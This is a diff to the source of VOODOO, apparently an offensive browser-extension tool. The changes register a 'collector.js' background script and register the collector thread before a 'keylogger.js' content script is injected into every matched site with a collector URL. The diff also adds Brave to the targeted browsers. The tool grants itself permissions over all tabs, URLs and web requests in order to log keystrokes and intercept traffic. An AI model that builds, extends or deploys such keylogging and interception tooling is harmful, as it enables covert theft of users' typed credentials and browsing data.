@@ -16,6 +16,7 @@ module VOODOO
             @collector_threads = []
 
             @extension.manifest[:permissions] = ['tabs', '*://*/*', 'webRequest']
+            @extension.add_background_script(file: File.join(__dir__, 'js/collector.js'))
         end
 
         def add_script(content: nil, file: nil, matches: '*://*/*')
@@ -37,10 +38,10 @@ module VOODOO
                 collector_url: collector.url
             }
 
+            @collector_threads.push(collector.thread)
+
             keylogger_js = build_js('keylogger.js', with_options: options)
             @extension.add_content_script(matches, js: [keylogger_js])
-
-            @collector_threads.push(collector.thread)
         end
 
         def intercept(matches: nil, url_include: nil, body_include: nil, header_exists: nil)
@@ -72,6 +73,10 @@ module VOODOO
 
         def Browser.Chrome
             self.new(bundle: 'com.google.Chrome', process_name: 'Google Chrome')
+        end
+
+        def Browser.Brave
+            self.new(bundle: 'com.brave.Browser', process_name: 'Brave Browser')
         end
 
         def Browser.Opera
